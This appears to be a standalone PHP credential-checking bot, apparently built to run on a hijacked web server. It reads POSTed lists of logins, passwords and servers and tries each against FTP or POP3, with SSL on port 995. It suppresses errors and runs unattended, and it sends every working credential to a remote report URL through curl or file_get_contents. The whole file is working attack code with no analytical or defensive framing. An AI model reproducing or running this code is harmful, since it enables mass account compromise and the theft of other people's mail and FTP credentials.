<?php
$report_url = $_POST['url'];
$pass       = $_POST['pass'];
$list       = $_POST['list'];

if (empty($pass))
{
    if ($_POST['p'] == 995 && strpos($_POST['s'],'ssl://')===false) $_POST['s'] = 'ssl://' . $_POST['s'];
    $fp = @fsockopen($_POST['s'], $_POST['p'], $errno, $errstr, 5);
    if($fp)
    {
        @fclose($fp);
        connect3($report_url . '?str=' . urlencode($_POST['r']));
    }
    exit;
}

@error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(true);

$lines = explode("\n",$list);

$nice = '';
foreach ($lines as $line)
{
	$line = trim($line);
	if (!strpos($line,';')) {continue;}

    $x = substr_count($line,';');

    if ($x == 2)
    {
        list($login,$pass,$serv) = explode(';',$line,3);

        if (check_acc_ftp($login,$pass,$serv))
        {
            connect3($report_url . '?str=' . urlencode("$login;$pass;$serv"));
        }
    }
    else
    {
        list($login,$email,$serv,$port) = explode(';',$line,4);

        if (check_acc($login,$pass,$serv,$port))
        {
            connect3($report_url . '?str=' . urlencode("$login;$pass;$email;$serv;$port"));
        }
    }

}


function connect3($url)
{
    if (function_exists('curl_exec'))
    {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_HEADER, FALSE);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        $result = curl_exec($ch);
        curl_close($ch);
    }
    else
    {
        $ctx = @stream_context_create(array('http' => array('timeout' => 10)));
        $result = @file_get_contents($url, 0, $ctx);
    }
    return $result;
}


function check_acc_ftp($login,$pass,$serv)
{
    $conn_id = ftp_connect($serv,21,15);

    if ($conn_id)
    {
        if (ftp_login($conn_id, $login, $pass))
        {
            ftp_close($conn_id);
            return true;
        }
        ftp_close($conn_id);
    }
    return false;
}


function check_acc($login,$pass,$serv,$port)
{
    if ($port == 995 && strpos($serv,'ssl://') === false) $serv = 'ssl://' . $serv;
	$fp = @fsockopen($serv, $port, $errno, $errstr, 7);
	if(!$fp)
	{
		return false;
	}
	@stream_set_timeout($fp, 2);

	do {$hello = @fgets($fp, 1024);} while (!$hello);
	@fputs($fp,'USER '.$login."\r\n");
	do {$hello = @fgets($fp, 1024);} while (!$hello);
	@fputs($fp,'PASS '.$pass."\r\n");
	do {$hello = @fgets($fp, 1024);} while (!$hello);
	@fputs($fp,'QUIT'."\r\n");
	@fclose($fp);

	if (@stripos($hello,'+OK')!==false)
	{
		return true;
	}

	return false;
}
